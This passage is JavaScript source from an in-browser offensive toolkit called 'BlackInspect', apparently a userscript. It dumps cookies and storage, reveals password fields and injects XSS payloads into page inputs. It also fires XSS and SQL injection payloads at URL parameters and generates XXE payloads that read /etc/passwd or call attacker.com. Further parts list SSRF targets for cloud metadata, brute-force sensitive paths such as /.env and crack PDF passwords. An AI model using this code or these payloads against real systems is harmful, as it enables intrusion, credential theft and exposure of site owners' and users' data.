                    <button id="viewLS" class="bi-btn-dim" style="width:100%;margin-bottom:6px;">View LocalStorage</button>
                    <div id="lsView" class="bi-scroll bi-code" style="max-height:180px;font-size:11px;"></div>
                </div>
            </div>
            <div>
                <div class="bi-card">
                    <h4>📦 ${T("SessionStorage")}</h4>
                    <button id="viewSS" class="bi-btn-dim" style="width:100%;margin-bottom:6px;">View SessionStorage</button>
                    <div id="ssView" class="bi-scroll bi-code" style="max-height:120px;font-size:11px;"></div>
                </div>
                <div class="bi-card">
                    <h4>✏️ Set Value</h4>
                    <label>Key</label><input id="storKey" placeholder="key" style="margin-bottom:4px;">
                    <label>Value</label><input id="storVal" placeholder="value" style="margin-bottom:8px;">
                    <div class="bi-grid2" style="gap:4px;">
                        <button id="setCookie" class="bi-btn-dim">🍪 Cookie</button>
                        <button id="setLS" class="bi-btn-dim">📦 LocalStorage</button>
                    </div>
                    <div id="storOut" class="bi-status bi-ok"></div>
                </div>
            </div>
            </div>`;

        D.getElementById("viewCookies").onclick = () => {
          const entries = D.cookie.split(";").map((c) => {
            const [k, ...v] = c.trim().split("=");
            return `<div style="border-bottom:1px solid #21262d;padding:4px 0;"><span style="color:#9cdcfe;">${k.trim()}</span> = <span style="color:#ce9178;">${v.join("=").trim()}</span></div>`;
          });
          D.getElementById("cookieView").innerHTML =
            entries.join("") ||
            `<span class="bi-muted">${T("No cookies")}</span>`;
        };
        D.getElementById("viewLS").onclick = () => {
          let h = "";
          try {
            for (let i = 0; i < localStorage.length; i++) {
              const k = localStorage.key(i);
              h += `<div style="border-bottom:1px solid #21262d;padding:4px 0;"><span style="color:#9cdcfe;">${k}</span> = <span style="color:#ce9178;">${(localStorage.getItem(k) || "").substring(0, 200)}</span></div>`;
            }
          } catch (e) {}
          D.getElementById("lsView").innerHTML =
            h || `<span class="bi-muted">Empty</span>`;
        };
        D.getElementById("viewSS").onclick = () => {
          let h = "";
          try {
            for (let i = 0; i < sessionStorage.length; i++) {
              const k = sessionStorage.key(i);
              h += `<div style="border-bottom:1px solid #21262d;padding:4px 0;"><span style="color:#9cdcfe;">${k}</span> = <span style="color:#ce9178;">${(sessionStorage.getItem(k) || "").substring(0, 200)}</span></div>`;
            }
          } catch (e) {}
          D.getElementById("ssView").innerHTML =
            h || `<span class="bi-muted">Empty</span>`;
        };
        D.getElementById("setCookie").onclick = () => {
          const k = D.getElementById("storKey").value.trim(),
            v = D.getElementById("storVal").value;
          if (!k) return;
          D.cookie = `${k}=${encodeURIComponent(v)};path=/;SameSite=Lax`;
          D.getElementById("storOut").textContent = `✅ Cookie set: ${k}`;
        };
        D.getElementById("setLS").onclick = () => {
          const k = D.getElementById("storKey").value.trim(),
            v = D.getElementById("storVal").value;
          if (!k) return;
          try {
            localStorage.setItem(k, v);
            D.getElementById("storOut").textContent =
              `✅ LocalStorage set: ${k}`;
          } catch (e) {
            D.getElementById("storOut").textContent = "❌ " + e.message;
          }
        };
      } else if (tab === "Tools") {
        c.innerHTML = `
            <div class="bi-grid2">
            <div>
                <div class="bi-card">
                    <h4>🔓 Restrictions</h4>
                    <button id="breakBtn" style="width:100%;margin-bottom:4px;${restrictionsBroken ? "background:#238636" : "background:#da3633"};color:#fff;">
                        ${restrictionsBroken ? "🔄 " + T("Restore Restrictions") : "🔓 " + T("Break Restrictions")}
                    </button>
                    <div id="brkOpts" style="display:${restrictionsBroken ? "none" : "block"};">
                        <div class="bi-check-row"><input type="checkbox" id="brkCtx" checked><label for="brkCtx">Context menu</label></div>
                        <div class="bi-check-row"><input type="checkbox" id="brkCopy" checked><label for="brkCopy">Copy</label></div>
                        <div class="bi-check-row"><input type="checkbox" id="brkPaste" checked><label for="brkPaste">Paste</label></div>
                        <div class="bi-check-row"><input type="checkbox" id="brkSel" checked><label for="brkSel">Selectstart</label></div>
                        <div class="bi-check-row"><input type="checkbox" id="brkDrag" checked><label for="brkDrag">Drag</label></div>
                        <button id="doBreak" class="bi-btn-red" style="width:100%;margin-top:8px;">Apply</button>
                    </div>
                    <div id="brkStatus" class="bi-status ${restrictionsBroken ? "bi-ok" : ""}"></div>
                </div>
                <div class="bi-card">
                    <h4>💉 XSS Inject (Debug)</h4>
                    <select id="xssPayload" style="margin-bottom:6px;">
                        <option value='<script>alert(1)<\/script>'>&lt;script&gt;alert(1)&lt;/script&gt;</option>
                        <option value='"><img src=x onerror=alert(1)>'>&gt;&lt;img onerror&gt;</option>
                        <option value="'><svg/onload=alert(1)>">&gt;&lt;svg onload&gt;</option>
                        <option value='<details open ontoggle=alert(1)>'>&lt;details ontoggle&gt;</option>
                        <option value='<input onfocus=alert(1) autofocus>'>&lt;input autofocus&gt;</option>
                    </select>
                    <button id="injectXSS" class="bi-btn-orange" style="width:100%;">💉 Inject to inputs</button>
                    <div id="xssOut" class="bi-status"></div>
                </div>
            </div>
            <div>
                <div class="bi-card">
                    <h4>⚡ Quick Actions</h4>
                    <div class="bi-grid2" style="gap:4px;">
                        <button id="bdown"  class="bi-btn-blue">📦 Download Page</button>
                        <button id="cpText" class="bi-btn-dim">📋 Copy Text</button>
                        <button id="ssBtn"  class="bi-btn-dim">📸 Screenshot</button>
                        <button id="shPW"   class="bi-btn-dim">👁 Show Passwords</button>
                        <button id="stopLoadBtn" class="bi-btn-dim">⏹ Stop Loading</button>
                        <button id="reloadBtn"  class="bi-btn-dim">🔄 Reload</button>
                        <button id="resetPosBtn" class="bi-btn-dim">📐 Reset Panel</button>
                        <button id="popupBtn"   class="bi-btn-dim">🪟 Popup Panel</button>
                    </div>
                    <div id="toolsOut" class="bi-status bi-ok"></div>
                </div>
                <div class="bi-card">
                    <h4>🖥 ${T("Split AI")}</h4>
                    <select id="aiSvc" style="margin-bottom:6px;">
                        <option value="">— Select AI —</option>
                        <option value="chatgpt">ChatGPT</option>
                        <option value="deepseek">DeepSeek</option>
                        <option value="gemini">Gemini</option>
                        <option value="claude">Claude</option>
                        <option value="kimi">Kimi</option>
                        <option value="grok">Grok</option>
                    </select>
                    <button id="openSplit" class="bi-btn-blue" style="width:100%;">🖥 Open Split</button>
                </div>
            </div>
            </div>`;

        const tout = D.getElementById("toolsOut");
        D.getElementById("breakBtn").onclick = () => {
          if (restrictionsBroken) {
            location.reload();
          } else {
            const o = D.getElementById("brkOpts");
            o.style.display = o.style.display === "none" ? "block" : "none";
          }
        };
        D.getElementById("doBreak").onclick = () => {
          const opts = {
            contextmenu: D.getElementById("brkCtx").checked,
            copy: D.getElementById("brkCopy").checked,
            paste: D.getElementById("brkPaste").checked,
            selectstart: D.getElementById("brkSel").checked,
            dragstart: D.getElementById("brkDrag").checked,
            mousedown: true,
          };
          S.breakOptions = opts;
          breakRestrictions(opts);
          restrictionsBroken = true;
          D.getElementById("breakBtn").style.background = "#238636";
          D.getElementById("breakBtn").textContent =
            "🔄 " + T("Restore Restrictions");
          D.getElementById("brkOpts").style.display = "none";
          D.getElementById("brkStatus").className = "bi-status bi-ok";
          D.getElementById("brkStatus").textContent = "✅ Restrictions broken.";
        };
        D.getElementById("injectXSS").onclick = () => {
          const p = D.getElementById("xssPayload").value;
          const inps = D.querySelectorAll(
            "input[type=text],input:not([type]),textarea",
          );
          inps.forEach((i) => {
            i.value = p;
            i.dispatchEvent(new Event("input", { bubbles: true }));
          });
          D.getElementById("xssOut").className = "bi-status bi-ok";
          D.getElementById("xssOut").textContent =
            `✅ Injected into ${inps.length} fields.`;
        };
        D.getElementById("bdown").onclick = async () => {
          tout.textContent = "⏳ Collecting...";
          const cl = D.documentElement.cloneNode(true);
          dlBlob(
            new Blob(["<!DOCTYPE html>\n" + cl.outerHTML], {
              type: "text/html",
            }),
            D.title.replace(/[^a-z0-9]/gi, "_") + "_fullpage.html",
          );
          tout.textContent = "✅ Downloaded!";
        };
        D.getElementById("cpText").onclick = () => {
          breakRestrictions();
          const walker = D.createTreeWalker(D.body, NodeFilter.SHOW_TEXT, {
            acceptNode: (n) =>
              n.parentNode.closest("#" + BS)
                ? NodeFilter.FILTER_REJECT
                : NodeFilter.FILTER_ACCEPT,
          });
          let text = "";
          while (walker.nextNode()) text += walker.currentNode.nodeValue;
          N.clipboard?.writeText(text).then(() => {
            tout.textContent = `✅ Copied ${text.length} chars.`;
          });
        };
        D.getElementById("ssBtn").onclick = () => {
          tout.textContent = "📸 Capturing...";
          takeScreenshot().then(
            () => (tout.textContent = "✅ Screenshot saved."),
          );
        };
        D.getElementById("shPW").onclick = () => {
          const inps = D.querySelectorAll("input[type=password]");
          inps.forEach((i) => (i.type = "text"));
          tout.textContent = `✅ ${inps.length} fields revealed.`;
        };
        let stopped = false;
        D.getElementById("stopLoadBtn").onclick = () => {
          if (!stopped) {
            W.stop();
            stopped = true;
            D.getElementById("stopLoadBtn").textContent = "▶ Resume";
          } else {
            location.reload();
          }
        };
        D.getElementById("reloadBtn").onclick = () => location.reload();
        D.getElementById("resetPosBtn").onclick = resetPanelPos;
        D.getElementById("popupBtn").onclick = () => {
          const w = window.open(
            "",
            "BiPopup",
            "width=900,height=600,resizable=yes",
          );
          if (!w) {
            tout.textContent = "❌ Popup blocked.";
            return;
          }
          w.document.write(
            `<!DOCTYPE html><html><head><title>BlackInspect</title><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css"><style>body{margin:0;background:#0d1117;color:#c9d1d9;font-family:'Vazirmatn','IBM Plex Mono',monospace;padding:20px;}</style></head><body><h2 style="color:#58a6ff;">⚙ BlackInspect v7.0</h2><textarea style="width:100%;height:80%;background:#161b22;color:#c9d1d9;border:1px solid #30363d;padding:10px;font-family:inherit;border-radius:8px;" placeholder="Quick notes..."></textarea></body></html>`,
          );
          tout.textContent = "✅ Popup opened.";
        };
        const aiUrls = {
          chatgpt: "https://chat.openai.com",
          deepseek: "https://chat.deepseek.com",
          gemini: "https://gemini.google.com",
          claude: "https://claude.ai",
          kimi: "https://kimi.moonshot.cn",
          grok: "https://grok.x.ai",
        };
        D.getElementById("openSplit").onclick = () => {
          const svc = D.getElementById("aiSvc").value;
          if (!svc) return;
          const url = aiUrls[svc];
          const pw = Math.floor(W.innerWidth / 2),
            ph = W.innerHeight;
          const px = W.screenX + (W.outerWidth - pw),
            py = W.screenY;
          const popup = window.open(
            url,
            "_blank",
            `width=${pw},height=${ph},left=${px},top=${py}`,
          );
          tout.textContent = popup ? `✅ ${svc} opened.` : "❌ Popup blocked.";
        };
      } else if (tab === "Network") {
        c.innerHTML = `
            <div class="bi-grid2">
            <div>
                <div class="bi-card">
                    <h4>🔑 ${T("Auth Injection")}</h4>
                    <label>${T("Header Name")}</label><input id="authHN" value="${S.authHName}" style="margin-bottom:4px;">
                    <label>${T("Token Value")}</label><input id="authHV" value="${S.authHVal}" placeholder="Bearer eyJ..." style="margin-bottom:8px;">
                    <div class="bi-row">
                        <button id="startAuth" class="bi-btn-blue" style="flex:1;">▶ Inject</button>
                        <button id="stopAuth" class="bi-btn-red" style="flex:1;">⏹ Stop</button>
                    </div>
                    <div id="authStatus" class="bi-status ${S.authActive ? "bi-ok" : ""}">${S.authActive ? "✅ Injection active" : ""}</div>
                </div>
                <div class="bi-card">
                    <h4>🚫 ${T("Prevent Preflight")}</h4>
                    <div class="bi-check-row"><input type="checkbox" id="prefToggle" ${S.preventPre ? "checked" : ""}><label for="prefToggle">${T("Prevent Preflight")}</label></div>
                    <div class="bi-muted">Strips non-simple headers to avoid CORS preflight requests.</div>
                    <div id="prefStatus" class="bi-status ${S.preventPre ? "bi-ok" : ""}"></div>
                </div>
            </div>
            <div>
                <div class="bi-card">
                    <h4>🔒 ${T("SSL Headers")}</h4>
                    <button id="analyzeHdrs" class="bi-btn-blue" style="width:100%;margin-bottom:8px;">🔍 Analyze</button>
                    <div id="sslResult" style="font-size:11px;"></div>
                </div>
                <div class="bi-card">
                    <h4>✏️ Request Modifier</h4>
                    <label>URL regex</label><input id="modUrl" placeholder=".*" style="margin-bottom:4px;">
                    <label>Header name</label><input id="modHN" placeholder="X-Custom-Header" style="margin-bottom:4px;">
                    <label>Header value</label><input id="modHV" placeholder="value" style="margin-bottom:8px;">
                    <div class="bi-row">
                        <button id="applyMod" class="bi-btn-blue" style="flex:1;">Apply</button>
                        <button id="resetMod" class="bi-btn-red" style="flex:1;">Reset</button>
                    </div>
                    <div id="modStatus" class="bi-status"></div>
                </div>
            </div>
            </div>`;

        D.getElementById("startAuth").onclick = () => {
          const hn = D.getElementById("authHN").value.trim(),
            hv = D.getElementById("authHV").value.trim();
          if (!hv) {
            D.getElementById("authStatus").textContent = "⚠ Value required.";
            return;
          }
          S.authHName = hn;
          S.authHVal = hv;
          S.authActive = true;
          applyAuthInjection();
          D.getElementById("authStatus").className = "bi-status bi-ok";
          D.getElementById("authStatus").textContent = "✅ Injection active.";
        };
        D.getElementById("stopAuth").onclick = () => {
          S.authActive = false;
          D.getElementById("authStatus").className = "bi-status bi-muted";
          D.getElementById("authStatus").textContent = "⏹ Stopped.";
        };
        D.getElementById("prefToggle").onchange = function () {
          S.preventPre = this.checked;
          if (this.checked) applyPreflightPrevention();
          D.getElementById("prefStatus").textContent = this.checked
            ? "✅ Active"
            : "";
          D.getElementById("prefStatus").className =
            "bi-status " + (this.checked ? "bi-ok" : "");
        };
        D.getElementById("analyzeHdrs").onclick = async () => {
          const res = D.getElementById("sslResult");
          res.innerHTML = "⏳ Analyzing...";
          try {
            const r = await fetch(location.href, { method: "HEAD" });
            const checks = [
              { n: "HSTS", h: "strict-transport-security" },
              { n: "CSP", h: "content-security-policy" },
              { n: "X-Frame-Options", h: "x-frame-options" },
              { n: "X-Content-Type-Options", h: "x-content-type-options" },
              { n: "X-XSS-Protection", h: "x-xss-protection" },
              { n: "Referrer-Policy", h: "referrer-policy" },
              { n: "Permissions-Policy", h: "permissions-policy" },
            ];
            res.innerHTML = checks
              .map((c) => {
                const v = r.headers.get(c.h);
                return `<div style="margin-bottom:3px;display:flex;justify-content:space-between;"><span style="color:#8b949e;">${c.n}</span><span style="color:${v ? "#3fb950" : "#f85149"};font-size:11px;">${v ? "✅ " + v.substring(0, 40) : "❌ Missing"}</span></div>`;
              })
              .join("");
          } catch (e) {
            res.textContent = "❌ " + e.message;
          }
        };
        let modOrig = W.fetch,
          modActive = false;
        D.getElementById("applyMod").onclick = () => {
          if (modActive) return;
          const p = D.getElementById("modUrl").value.trim(),
            hn = D.getElementById("modHN").value.trim(),
            hv = D.getElementById("modHV").value.trim();
          if (!hn) {
            D.getElementById("modStatus").textContent =
              "⚠ Header name required.";
            return;
          }
          let rx;
          try {
            rx = new RegExp(p);
          } catch (e) {
            D.getElementById("modStatus").textContent = "❌ Invalid regex.";
            return;
          }
          modActive = true;
          W.fetch = function (...a) {
            const url = typeof a[0] === "string" ? a[0] : a[0].url;
            if (rx.test(url)) {
              const h = new Headers((a[1] || {}).headers || {});
              h.set(hn, hv);
              return modOrig(a[0], { ...a[1], headers: h });
            }
            return modOrig.apply(this, a);
          };
          D.getElementById("modStatus").className = "bi-status bi-ok";
          D.getElementById("modStatus").textContent = "✅ Applied.";
        };
        D.getElementById("resetMod").onclick = () => {
          if (modActive) {
            W.fetch = modOrig;
            modActive = false;
            D.getElementById("modStatus").textContent = "🔄 Reset.";
          }
        };
      } else if (tab === "Security") {
        const XSS_P = [
          "<script>alert(1)<\/script>",
          '"><img src=x onerror=alert(1)>',
          "'><svg/onload=alert(1)>",
          "<body onload=alert(1)>",
          '"-alert(1)-"',
        ];
        const SQLI_P = [
          "'",
          '\"',
          "' OR '1'='1",
          '" OR "1"="1',
          "' OR 1=1--",
          "1 UNION SELECT null--",
          "' AND SLEEP(3)--",
        ];
        const SQLI_E = [
          "sql syntax",
          "mysql_fetch",
          "ora-",
          "sqlite_",
          "pg_query",
          "syntax error",
          "odbc driver",
        ];
        c.innerHTML = `
            <div class="bi-grid2">
            <div>
                <div class="bi-card">
                    <h4>💉 ${T("XSS Scanner")}</h4>
                    <button id="scanXSS" class="bi-btn-red" style="width:100%;">🔍 ${T("Scan")}</button>
                    <div id="xssRes" class="bi-scroll bi-status" style="max-height:100px;margin-top:6px;"></div>
                </div>
                <div class="bi-card">
                    <h4>🗄 ${T("SQLi Scanner")}</h4>
                    <button id="scanSQLi" class="bi-btn-red" style="width:100%;">🔍 ${T("Scan")}</button>
                    <div id="sqliRes" class="bi-scroll bi-status" style="max-height:100px;margin-top:6px;"></div>
                </div>
                <div class="bi-card">
                    <h4>🖼 ${T("Clickjacking")}</h4>
                    <button id="scanCJ" class="bi-btn-dim" style="width:100%;">🔍 ${T("Scan")}</button>
                    <div id="cjRes" class="bi-status" style="margin-top:6px;"></div>
                </div>
                <div class="bi-card">
                    <h4>📝 ${T("HTML Injection")}</h4>
                    <button id="scanHTML" class="bi-btn-dim" style="width:100%;">🔍 ${T("Scan")}</button>
                    <div id="htmlRes" class="bi-scroll bi-status" style="max-height:80px;margin-top:6px;"></div>
                </div>
            </div>
            <div>
                <div class="bi-card">
                    <h4>📄 ${T("XXE Payloads")}</h4>
                    <button id="genXXE" class="bi-btn-dim" style="width:100%;margin-bottom:6px;">📋 Generate</button>
                    <div id="xxeRes" class="bi-code" style="max-height:80px;"></div>
                </div>
                <div class="bi-card">
                    <h4>🌐 ${T("SSRF Payloads")}</h4>
                    <button id="genSSRF" class="bi-btn-dim" style="width:100%;margin-bottom:6px;">📋 Generate</button>
                    <div id="ssrfRes" class="bi-code" style="max-height:80px;"></div>
                </div>
                <div class="bi-card">
                    <h4>🌍 ${T("Subdomain Takeover")}</h4>
                    <input id="subTarget" value="${location.hostname}" style="margin-bottom:6px;">
                    <button id="scanSub" class="bi-btn-dim" style="width:100%;">🔍 ${T("Scan")}</button>
                    <div id="subRes" class="bi-status" style="margin-top:6px;"></div>
                </div>
                <div class="bi-card">
                    <h4>📂 ${T("Directory BF")}</h4>
                    <input id="dirTarget" value="${location.origin}" style="margin-bottom:6px;">
                    <div class="bi-row">
                        <button id="scanDir" class="bi-btn-dim" style="flex:1;">🔍 Scan</button>
                        <button id="stopDir" class="bi-btn-red" style="flex:1;">⏹ Stop</button>
                    </div>
                    <div id="dirRes" class="bi-scroll bi-code" style="max-height:120px;margin-top:6px;"></div>
                </div>
            </div>
            </div>`;

        const scanParams = async (payloads, checkFn, resId, stopId) => {
          const res = D.getElementById(resId);
          res.innerHTML = "⏳ " + T("Scanning...");
          const url = new URL(location.href);
          const params = [...url.searchParams.entries()];
          if (!params.length) {
            res.innerHTML = `<span class="bi-warn">ℹ ${T("No params")}</span>`;
            return;
          }
          let found = [];
          for (const [k] of params) {
            for (const p of payloads) {
              const tu = new URL(location.href);
              tu.searchParams.set(k, p);
              try {
                const r = await fetch(tu.toString(), {
                  credentials: "same-origin",
                });
                const t = await r.text();
                if (checkFn(t, p)) {
                  found.push({ param: k, payload: p.substring(0, 50) });
                  break;
                }
              } catch (e) {}
            }
          }
          res.innerHTML = found.length
            ? found
                .map(
                  (f) =>
                    `<div style="color:#f85149;">⚠ <b>${f.param}</b>: ${T("Vulnerable")}<br><small>${f.payload}</small></div>`,
                )
                .join("")
            : params
                .map(
                  ([k]) =>
                    `<div style="color:#3fb950;">✅ ${k}: ${T("Protected")}</div>`,
                )
                .join("");
        };

        D.getElementById("scanXSS").onclick = () =>
          scanParams(XSS_P, (t, p) => t.includes(p), "xssRes");
        D.getElementById("scanSQLi").onclick = () =>
          scanParams(
            SQLI_P,
            (t) => SQLI_E.some((e) => t.toLowerCase().includes(e)),
            "sqliRes",
          );
        D.getElementById("scanHTML").onclick = () =>
          scanParams(
            ["<h1>HTMLI</h1>", "<b>injected</b>"],
            (t, p) => t.includes(p),
            "htmlRes",
          );

        D.getElementById("scanCJ").onclick = async () => {
          const res = D.getElementById("cjRes");
          res.innerHTML = "⏳...";
          try {
            const r = await fetch(location.href, { method: "HEAD" });
            const xfo = r.headers.get("x-frame-options");
            const csp = r.headers.get("content-security-policy") || "";
            const vuln = !xfo && !csp.includes("frame-ancestors");
            res.innerHTML = `<div>X-Frame-Options: ${xfo ? `<span style="color:#3fb950;">${xfo}</span>` : '<span style="color:#f85149;">NOT SET</span>'}</div>
                    <div>CSP frame-ancestors: ${csp.includes("frame-ancestors") ? '<span style="color:#3fb950;">✅</span>' : '<span style="color:#f85149;">❌</span>'}</div>
                    <div style="margin-top:4px;font-weight:bold;color:${vuln ? "#f85149" : "#3fb950"};">${vuln ? T("Vulnerable") : T("Protected")}</div>`;
          } catch (e) {
            res.textContent = "❌ " + e.message;
          }
        };

        D.getElementById("genXXE").onclick = () => {
          D.getElementById("xxeRes").textContent = [
            `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
            `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><root>&xxe;</root>`,
            `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>`,
          ].join("\n\n");
        };
        D.getElementById("genSSRF").onclick = () => {
          D.getElementById("ssrfRes").textContent = [
            "http://127.0.0.1/",
            "http://localhost/",
            "http://169.254.169.254/",
            "http://169.254.169.254/latest/meta-data/",
            "http://[::1]/",
            "file:///etc/passwd",
            "dict://127.0.0.1:11211/stat",
            "http://metadata.google.internal/computeMetadata/v1/",
          ].join("\n");
        };

        D.getElementById("scanSub").onclick = async () => {
          const res = D.getElementById("subRes");
          res.innerHTML = "⏳...";
          const target = D.getElementById("subTarget").value.trim();

          if (S.kernelOnline) {
            try {
              const r = await kernelFetch("/scan/subdomains", {
                method: "POST",
                body: JSON.stringify({ domain: target }),
              });
              const d = await r.json();
              res.innerHTML =
                `<div style="color:#3fb950;">✅ ${d.alive_count} alive subdomains</div>` +
                d.alive
                  .map(
                    (a) =>
                      `<div style="color:#58a6ff;">${a.subdomain} → ${a.ips.join(",")}</div>`,
                  )
                  .join("") +
                d.cname_risk
                  .map(
                    (a) =>
                      `<div style="color:#d29922;">⚠ ${a.subdomain} CNAME→${a.service}</div>`,
                  )
                  .join("");
              return;
            } catch (e) {}
          }

          try {
            const r = await fetch(
              `https://dns.google/resolve?name=${target}&type=CNAME`,
            );
            const d = await r.json();
            const cname =
              (d.Answer || []).find((a) => a.type === 5)?.data || "";
            const services = {
              "github.io": "GitHub Pages",
              "herokuapp.com": "Heroku",
              "netlify.app": "Netlify",
              "vercel.app": "Vercel",
              "s3.amazonaws.com": "AWS S3",
            };
            if (cname) {
              const match = Object.entries(services).find(([k]) =>
                cname.includes(k),
              );
              res.innerHTML = match
                ? `<div style="color:#d29922;">⚠ CNAME → ${cname} (${match[1]}) — potential takeover!</div>`
                : `<div style="color:#3fb950;">✅ CNAME → ${cname} — no known risk.</div>`;
            } else {
              res.innerHTML = '<span class="bi-muted">No CNAME record.</span>';
            }
          } catch (e) {
            res.textContent = "❌ " + e.message;
          }
        };

        dirScanStop = false;
        D.getElementById("scanDir").onclick = async () => {
          dirScanStop = false;
          const res = D.getElementById("dirRes");
          const target = (
            D.getElementById("dirTarget").value.trim() || location.origin
          ).replace(/\/$/, "");
          if (S.kernelOnline) {
            res.innerHTML = "⏳ Using kernel scanner...";
            try {
              const r = await kernelFetch("/scan/directory", {
                method: "POST",
                body: JSON.stringify({ target, concurrency: 8 }),
              });
              const d = await r.json();
              res.innerHTML =
                `✅ Scanned ${d.scanned} paths, found ${d.found.length}:\n` +
                d.found
                  .map(
                    (f) =>
                      `<span style="color:${f.status < 400 ? "#3fb950" : "#8b949e"};">[${f.status}] ${f.path}</span>`,
                  )
                  .join("\n");
              return;
            } catch (e) {}
          }
          const paths = [
            "/admin",
            "/login",
            "/.env",
            "/.git/config",
            "/api",
            "/config",
            "/backup",
            "/robots.txt",
            "/sitemap.xml",
            "/.htaccess",
            "/phpMyAdmin",
            "/wp-admin",
            "/console",
            "/dashboard",
            "/api/v1",
            "/api/v2",
            "/secret",
            "/test",
            "/dev",
            "/staging",
          ];
          res.innerHTML = `⏳ Scanning ${paths.length} paths (browser mode)...\n`;
          for (const path of paths) {
            if (dirScanStop) {
              res.innerHTML += "⏹ Stopped.";
              break;
            }
            try {
              const r = await fetch(target + path, {
                method: "HEAD",
                mode: "no-cors",
              });
              res.innerHTML += `<span style="color:#58a6ff;">[?] ${path}</span>\n`;
            } catch (e) {}
            await new Promise((r) => setTimeout(r, 30));
          }
          if (!dirScanStop) res.innerHTML += "✅ Done.";
        };
        D.getElementById("stopDir").onclick = () => (dirScanStop = true);
      } else if (tab === "PDF") {
        c.innerHTML = `
            <div class="bi-card">
                <h4>📄 ${T("Load PDF")}</h4>
                <div class="bi-row">
                    <input type="file" id="pdfFileInput" accept=".pdf" style="flex:1;">
                </div>
                <label>${T("PDF URL")}</label>
                <div class="bi-row">
                    <input id="pdfUrl" placeholder="https://example.com/file.pdf" style="flex:1;">
                    <button id="loadPdfUrl" class="bi-btn-dim" style="flex-shrink:0;">🌐 Load</button>
                </div>
                <label>${T("PDF Password")}</label>
                <div class="bi-row">
                    <input id="pdfPass" type="password" style="flex:1;">
                    <button id="openPdf" class="bi-btn-blue" style="flex-shrink:0;">📖 ${T("Open")}</button>
                </div>
                <div id="pdfStatus" class="bi-status"></div>
            </div>
            <div class="bi-card">
                <h4>🔓 ${T("Crack Password")}</h4>
                <div style="display:flex;gap:16px;margin-bottom:8px;">
                    <label><input type="radio" name="crackMode" id="crackCommon" checked> ${T("Common Passwords")}</label>
                    <label><input type="radio" name="crackMode" id="crackFile"> ${T("Custom Wordlist")}</label>
                    <label><input type="radio" name="crackMode" id="crackDigit"> ${T("Digit Range")}</label>
                </div>
                <input type="file" id="crackWL" accept=".txt" style="display:none;margin-bottom:6px;">
                <div id="digitRange" style="display:none;" class="bi-row">
                    <input id="digitFrom" placeholder="0000" style="flex:1;"><span>—</span><input id="digitTo" placeholder="9999" style="flex:1;">
                </div>
                <div class="bi-row" style="margin-top:8px;">
                    <button id="startCrack" class="bi-btn-red" style="flex:1;">🔓 ${T("Crack Password")}</button>
                    <button id="stopCrack" class="bi-btn-dim" style="flex:1;">⏹ Stop</button>
                </div>
                <div id="crackStatus" class="bi-status" style="margin-top:6px;"></div>
            </div>`;

        let pdfDoc = null,
          pdfPage = 1,
          pdfScale = 1.5,
          pdfData = null;
        let pdfPopup = null;

        const renderPdfPage = async (num) => {
          if (!pdfDoc || !pdfPopup || pdfPopup.closed) return;
          const page = await pdfDoc.getPage(num);
          const viewport = page.getViewport({ scale: pdfScale });
          const canvas = pdfPopup.document.getElementById("pdfCanvas");
          if (!canvas) return;
          canvas.height = viewport.height;
          canvas.width = viewport.width;
          const ctx = canvas.getContext("2d");
          ctx.clearRect(0, 0, canvas.width, canvas.height);
          await page.render({ canvasContext: ctx, viewport }).promise;
          pdfPopup.document.getElementById("pdfPageInfo").textContent =
            `${num} / ${pdfDoc.numPages}`;
        };

        const openPdfPopup = async (data, password = "") => {
          D.getElementById("pdfStatus").textContent = "⏳ Loading PDF.js...";
          try {
            await loadPdfjs();
            const task = pdfjsLib.getDocument({ data, password });
            pdfDoc = await task.promise;
            pdfData = data;
            pdfPage = 1;

            pdfPopup = window.open(
              "",
              "BiPDFViewer",
              "width=900,height=700,resizable=yes,scrollbars=yes",
            );
            if (!pdfPopup) {
              D.getElementById("pdfStatus").textContent = "❌ Popup blocked.";
              return;
            }

            pdfPopup.document
              .write(`<!DOCTYPE html><html><head><title>BlackInspect PDF</title>
                    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css">
                    <style>
                        body{margin:0;background:#1a1a2e;color:#c9d1d9;font-family:'Vazirmatn','IBM Plex Mono',monospace;}
                        .toolbar{background:#0d1117;padding:10px 16px;display:flex;align-items:center;gap:8px;border-bottom:1px solid #30363d;flex-wrap:wrap;}
                        button{background:#21262d;color:#c9d1d9;border:1px solid #30363d;border-radius:6px;padding:6px 14px;cursor:pointer;font-family:inherit;font-size:12px;}
                        button:hover{background:#30363d;}
                        #pageInfo{color:#8b949e;font-size:12px;min-width:60px;text-align:center;}
                        #canvasWrap{padding:20px;overflow:auto;display:flex;justify-content:center;cursor:text;min-height:calc(100vh - 60px);}
                        #pdfCanvas{box-shadow:0 8px 32px rgba(0,0,0,.7);border-radius:4px;cursor:text;}
                        #zoomVal{color:#58a6ff;font-size:12px;min-width:40px;text-align:center;}
                        .sep{color:#30363d;}
                    </style>
                    </head><body>
                    <div class="toolbar">
                        <button id="prevBtn">◀ Prev</button>
                        <span id="pdfPageInfo">— / —</span>
                        <button id="nextBtn">Next ▶</button>
                        <span class="sep">|</span>
                        <button id="zoomOut">🔍−</button>
                        <span id="zoomVal">150%</span>
                        <button id="zoomIn">🔍+</button>
                        <span class="sep">|</span>
                        <button id="fitWidth">⟷ Fit</button>
                        <button id="rotate">↻ Rotate</button>
                        <span class="sep">|</span>
                        <span style="color:#8b949e;font-size:12px;">Scroll to zoom · Click to select text</span>
                    </div>
                    <div id="canvasWrap"><canvas id="pdfCanvas"></canvas></div>
                    <script>
                        var scale=${pdfScale},rotation=0;
                        document.getElementById('prevBtn').onclick=function(){window.opener&&window.opener.biPdfPrev&&window.opener.biPdfPrev();};
                        document.getElementById('nextBtn').onclick=function(){window.opener&&window.opener.biPdfNext&&window.opener.biPdfNext();};
                        document.getElementById('zoomIn').onclick=function(){window.opener&&window.opener.biPdfZoom&&window.opener.biPdfZoom(0.25);};
                        document.getElementById('zoomOut').onclick=function(){window.opener&&window.opener.biPdfZoom&&window.opener.biPdfZoom(-0.25);};
                        document.getElementById('fitWidth').onclick=function(){window.opener&&window.opener.biPdfFit&&window.opener.biPdfFit();};
